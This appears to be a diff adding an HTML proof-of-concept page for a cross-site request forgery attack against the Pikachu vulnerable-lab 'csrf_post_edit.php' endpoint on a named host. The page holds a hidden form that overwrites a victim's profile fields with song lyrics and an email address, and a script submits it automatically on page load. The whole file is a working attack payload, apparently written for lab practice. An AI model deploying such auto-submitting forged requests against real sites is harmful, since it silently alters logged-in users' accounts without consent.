@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Never gonna give you up</title>
+  </head>
+
+  <body>
+    <form
+      action="http://www.liuboyu.site/pikachu/vul/csrf/csrfpost/csrf_post_edit.php"
+      method="post"
+      id="csrf_form"
+    >
+      <input type="hidden" name="sex" value="Never gonna give you up" />
+      <input type="hidden" name="phonenum" value="Never gonna let you down" />
+      <input
+        type="hidden"
+        name="add"
+        value="Never gonna run around and desert you"
+      />
+      <input type="hidden" name="email" value="2022201555@ruc.edu.cn" />
+      <input type="submit" value="submit" style="display: none" />
+    </form>
+  </body>
+
+  <script>
+    setTimeout(function () {
+      document.getElementById("csrf_form").submit();
+    }, 100);
+  </script>
+</html>
